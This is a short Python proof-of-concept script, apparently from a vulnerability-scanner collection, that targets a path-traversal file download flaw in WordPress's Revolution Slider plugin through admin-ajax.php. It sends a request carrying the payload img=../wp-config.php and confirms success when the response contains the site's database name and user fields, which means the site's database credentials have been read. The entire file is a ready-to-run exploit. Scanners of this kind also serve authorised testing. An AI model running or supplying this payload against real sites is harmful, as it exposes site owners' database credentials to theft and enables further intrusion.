#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: wordpress admin-ajax.php任意文件下载
referer: unknown
author: Lucifer
description: 文件admin-ajax.php中,参数img存在任意文件下载漏洞。
'''
import sys
import requests



class wordpress_admin_ajax_filedownload_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
            }
        payload = "/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"DB_NAME" in req.text and r"DB_USER" in req.text:
                return "[+]存在wordpress admin-ajax.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = wordpress_admin_ajax_filedownload_BaseVerify(sys.argv[1])
    testVuln.run()